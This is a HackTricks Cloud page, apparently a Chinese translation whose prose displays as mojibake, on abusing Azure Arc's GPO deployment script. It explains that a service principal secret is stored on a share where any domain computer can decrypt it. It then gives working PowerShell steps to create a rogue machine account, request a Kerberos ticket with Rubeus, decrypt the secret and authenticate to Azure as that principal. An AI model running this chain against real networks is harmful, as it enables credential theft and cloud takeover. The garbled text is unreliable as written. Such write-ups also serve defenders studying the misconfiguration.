# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc å…è®¸é€šè¿‡ç»„ç­–ç•¥å¯¹è±¡æ–¹æ³•å°†æ–°çš„å†…éƒ¨æœåŠ¡å™¨ï¼ˆåŠ å…¥åŸŸçš„æœåŠ¡å™¨ï¼‰é›†æˆåˆ° Azure Arc ä¸­ã€‚ä¸ºæ­¤ï¼ŒMicrosoft æä¾›äº†å¯åŠ¨å…¥é©»ç¨‹åºæ‰€éœ€çš„éƒ¨ç½²å·¥å…·åŒ…ã€‚åœ¨ ArcEnableServerGroupPolicy.zip æ–‡ä»¶ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ä»¥ä¸‹è„šæœ¬ï¼šDeployGPO.ps1ã€EnableAzureArc.ps1 å’Œ AzureArcDeployment.psm1ã€‚

æ‰§è¡Œ DeployGPO.ps1 è„šæœ¬æ—¶ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

1. åœ¨æœ¬åœ°åŸŸä¸­åˆ›å»º Azure Arc æœåŠ¡å™¨å…¥é©» GPOã€‚
2. å°† EnableAzureArc.ps1 å…¥é©»è„šæœ¬å¤åˆ¶åˆ°ä¸ºå…¥é©»è¿‡ç¨‹åˆ›å»ºçš„æŒ‡å®šç½‘ç»œå…±äº«ä¸­ï¼Œè¯¥å…±äº«è¿˜åŒ…å« Windows å®‰è£…ç¨‹åºåŒ…ã€‚

è¿è¡Œæ­¤è„šæœ¬æ—¶ï¼Œç³»ç»Ÿç®¡ç†å‘˜éœ€è¦æä¾›ä¸¤ä¸ªä¸»è¦å‚æ•°ï¼š**ServicePrincipalId** å’Œ **ServicePrincipalClientSecret**ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦å…¶ä»–å‚æ•°ï¼Œä¾‹å¦‚åŸŸã€æ‰˜ç®¡å…±äº«çš„æœåŠ¡å™¨çš„ FQDN å’Œå…±äº«åç§°ã€‚è¿˜å¿…é¡»å‘è„šæœ¬æä¾›ç§Ÿæˆ· IDã€èµ„æºç»„å’Œå…¶ä»–å¿…è¦ä¿¡æ¯ç­‰è¯¦ç»†ä¿¡æ¯ã€‚

åœ¨æŒ‡å®šå…±äº«çš„ AzureArcDeploy ç›®å½•ä¸­ä½¿ç”¨ DPAPI-NG åŠ å¯†ç”Ÿæˆä¸€ä¸ªåŠ å¯†çš„ç§˜å¯†ã€‚åŠ å¯†çš„ç§˜å¯†å­˜å‚¨åœ¨åä¸º encryptedServicePrincipalSecret çš„æ–‡ä»¶ä¸­ã€‚å¯ä»¥åœ¨ DeployGPO.ps1 è„šæœ¬ä¸­æ‰¾åˆ°è¯æ®ï¼Œå…¶ä¸­é€šè¿‡è°ƒç”¨ ProtectBase64 ä»¥ $descriptor å’Œ $ServicePrincipalSecret ä½œä¸ºè¾“å…¥æ¥æ‰§è¡ŒåŠ å¯†ã€‚æè¿°ç¬¦ç”±åŸŸè®¡ç®—æœºå’ŒåŸŸæ§åˆ¶å™¨ç»„ SID ç»„æˆï¼Œç¡®ä¿ ServicePrincipalSecret åªèƒ½ç”±åŸŸæ§åˆ¶å™¨å’ŒåŸŸè®¡ç®—æœºå®‰å…¨ç»„è§£å¯†ï¼Œå¦‚è„šæœ¬æ³¨é‡Šä¸­æ‰€è¿°ã€‚
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

æˆ‘ä»¬æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š

1. æˆ‘ä»¬å·²ç»æˆåŠŸæ¸—é€äº†å†…éƒ¨ç½‘ç»œã€‚
2. æˆ‘ä»¬æœ‰èƒ½åŠ›åœ¨Active Directoryä¸­åˆ›å»ºæˆ–æ§åˆ¶è®¡ç®—æœºè´¦æˆ·ã€‚
3. æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªåŒ…å«AzureArcDeployç›®å½•çš„ç½‘ç»œå…±äº«ã€‚

åœ¨ADç¯å¢ƒä¸­è·å–è®¡ç®—æœºè´¦æˆ·æœ‰å‡ ç§æ–¹æ³•ã€‚æœ€å¸¸è§çš„æ–¹æ³•ä¹‹ä¸€æ˜¯åˆ©ç”¨è®¡ç®—æœºè´¦æˆ·é…é¢ã€‚å¦ä¸€ç§æ–¹æ³•æ¶‰åŠé€šè¿‡è„†å¼±çš„ACLæˆ–å„ç§å…¶ä»–é”™è¯¯é…ç½®æ¥ç ´åè®¡ç®—æœºè´¦æˆ·ã€‚
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
ä¸€æ—¦è·å¾—æœºå™¨è´¦æˆ·ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥è´¦æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦æœ‰ netonly æ ‡å¿—çš„ runas.exe å‘½ä»¤ï¼Œæˆ–è€…ä½¿ç”¨ Rubeus.exe è¿›è¡Œ pass-the-ticketã€‚
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
é€šè¿‡å°†è®¡ç®—æœºå¸æˆ·çš„ TGT å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬è§£å¯†æœåŠ¡ä¸»ä½“å¯†é’¥ã€‚
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG)ã€‚

æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä»å­˜å‚¨åœ¨ä¸ encryptedServicePrincipalSecret æ–‡ä»¶ç›¸åŒçš„ç½‘ç»œå…±äº«ä¸Šçš„ ArcInfo.json æ–‡ä»¶ä¸­æ”¶é›†è¿æ¥åˆ° Azure æ‰€éœ€çš„å…¶ä½™ä¿¡æ¯ã€‚è¯¥æ–‡ä»¶åŒ…å«ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯ï¼šTenantIdã€servicePrincipalClientIdã€ResourceGroup ç­‰ã€‚å‡­å€Ÿè¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Azure CLI ä»¥è¢«æ”»é™·çš„æœåŠ¡ä¸»ä½“èº«ä»½è¿›è¡Œèº«ä»½éªŒè¯ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
